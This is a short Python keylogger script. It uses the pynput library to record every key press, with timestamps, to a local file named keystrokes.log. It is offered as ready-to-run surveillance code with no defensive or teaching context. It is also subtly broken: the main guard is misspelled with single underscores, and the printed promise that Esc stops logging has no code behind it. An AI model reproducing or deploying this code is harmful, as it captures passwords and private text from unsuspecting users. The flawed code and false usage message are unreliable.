import pynput.keyboard
from datetime import datetime

# Global variables
LOG_FILE = "keystrokes.log"

# Function to write keystrokes to a log file
def write_to_log(key):
    try:
        with open(LOG_FILE, "a") as f:
            # Formatting timestamp and key presses
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            if isinstance(key, pynput.keyboard.KeyCode):
                key = key.char
            f.write(f"[{timestamp}] Key pressed: {key}\n")
    except Exception as e:
        print(f"Error writing to log file: {str(e)}")

# Listener for key presses
def on_press(key):
    write_to_log(key)

# Starting the keylogger
def start_keylogger():
    print("Keylogger started. Press 'Esc' to stop.")
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if _name_ == "_main_":
    start_keylogger()
